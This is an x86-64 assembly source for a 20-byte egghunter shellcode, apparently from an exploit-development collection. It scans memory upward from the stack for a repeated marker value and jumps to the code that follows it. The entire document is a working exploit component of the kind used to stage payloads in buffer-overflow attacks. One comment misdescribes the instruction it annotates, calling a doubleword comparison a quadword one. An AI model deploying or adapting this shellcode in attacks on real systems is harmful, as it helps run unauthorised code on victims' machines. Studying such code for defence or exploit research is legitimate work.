;Shellcode Size 20 bytes
;Author shan8344
;Tessted on x64 Kali 2017 & Ubuntu 14

global _start

section .text

_start:

        mov eax, 0xabababab             ; Moving Egg to eax
        push rsp
        pop rbx                         ;Mov stack pointer address to rbx

IncByte:
        inc rbx                         ; Incrementing address value and moving the value to rdi
        push rbx
        pop rdi
        scasd                           ; Compare RAX with quadword at RDI and set status flags
        jnz IncByte
        scasd
        jnz IncByte
        jmp rdi                         ; Egg found jmp to shellcode
